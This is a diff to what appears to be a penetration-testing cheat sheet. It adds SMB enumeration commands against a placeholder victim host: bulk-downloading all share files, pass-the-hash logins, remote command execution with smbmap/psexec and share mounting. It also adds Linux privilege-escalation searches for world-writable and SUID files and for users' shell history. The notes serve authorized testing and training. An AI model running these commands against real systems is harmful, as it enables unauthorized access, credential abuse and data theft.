@@ -601,8 +601,15 @@ smbmap -vH $VICTIM_IP
 # recursively list directory contents
 smbmap -R -H $VICTIM_IP
 
-# try executing a command using wmi (can try psexec with '--mode psexec')
-smbmap -x 'ipconfig' $VICTIM_IP
+# tar all files [under a directory (no trailing slash on path)]
+smbclient //10.10.10.123/SHARENAME -N -Tc smbfiles.tar [/PATH/TO/DIR]
+
+# recursively get all files
+smbclient //$VICTIM_IP/SHARENAME
+> mask "" # don't filter any file names
+> recurse on # recursively execute commands
+> prompt off # don't prompt for file names
+> mget * # copy all files matching mask to host
 
 # standard scan
 enum4linux $VICTIM_IP
@@ -615,6 +622,9 @@ enum4linux -u guest -aMld $VICTIM_IP | tee enum4linux.log
 
 # nmap script scans
 nmap --script="safe and smb-*" -n -v -p 445 $VICTIM_IP
+
+# try executing a command using wmi (can try psexec with '--mode psexec')
+smbmap -x 'ipconfig' $VICTIM_IP -u USER -p PASSWORD
 ```
 
 For port 139 (netbios), you can also gather information like so:
@@ -655,19 +665,42 @@ Or you can add the flags `-m SMB2` or `-m SMB3` to your invocation of `smbclient
 # List shares without creds
 smbclient -N -L $VICTIM_IP
 
-# enumerate shares you have creds for (or ones that don't require creds)
-smbclient -L $VICTIM_IP -W DOMAIN -U svc-admin
+# Enumerate shares you have creds for
+# Can provide password after '%' with smbclient;
+# will prompt for password if omitted.
+smbclient -L $VICTIM_IP -W DOMAIN -U 'username[%password]'
+
+# Use  -c 'recurse;ls'  to list dirs recursively with smbclient
+# With --pw-nt-hash, the password is provided in NT hash form
+smbclient -U 'username%NTHASH' --pw-nt-hash -c 'recurse;ls' //$VICTIM_IP
+
+# List with smbmap, without SHARENAME it lists everything
+smbmap [-u "username" -p "password"] -R [SHARENAME] -H <IP> [-P <PORT>] # Recursive list
+smbmap [-u "username" -p "password"] -r [SHARENAME] -H <IP> [-P <PORT>] # Non-Recursive list
+smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [SHARENAME] -H <IP> [-P <PORT>] # Pass-the-Hash
 ```
+
+Common shares for Windows:
+- C$ - maps to C:/
+- ADMIN$ - maps to C:/Windows
+- IPC$ - used for RPC
+- Print$ - hosts drivers for shared printers
+- SYSVOL - only on DCs
+- NETLOGON - only on DCs
 
 ### 3.13.2. Interacting on SMB
 
 ```sh
 # Opens an interactive smb shell that you have creds for
-smbclient '\\TARGET_IP\dirname' -W DOMAIN -U username
+smbclient '\\TARGET_IP\dirname' -W DOMAIN -U username[%password]
+# add --pw-nt-hash to tell it to interpret password as NT hash (don't include LM portion)
 
 smb:\> help  # displays commands to use
 smb:\> ls  # list files
 smb:\> get filename.txt  # fetch a file
+
+# mount smb share
+mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
 ```
 
 ## 3.14. 1433 - Microsoft SQL Server Enumeration
@@ -2502,8 +2535,13 @@ grep "CRON" /var/log/cron.log
 # list every user's cron jobs
 for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l; done 2>/dev/null
 
+# find world-writable files
+# -mount doesn't descend into mounted file systems like /proc
+# -xdev is alternative equivalent to -mount on various systems
+find / -mount -type f -perm -o+w 2>/dev/null
+
 # find all SUID and SGID binaries
-find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2> /dev/null
 
 # shell history
 cat /home/*/.*history
@@ -2738,7 +2776,7 @@ void inject() {
 
 ```sh
 # find all root-owned SUID and GUID binaries
-find / -type f \( -perm -g+s -a -gid 0 \) -o \( -perm -u+s -a -uid 0 \) -exec ls -l {} \; 2>/dev/null
+find / -type f \( -perm -g+s -a -gid 0 \) -o \( -perm -u+s -a -uid 0 \) -ls 2>/dev/null
 
 # look for access to file that doesn't exist, but we might control
 strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
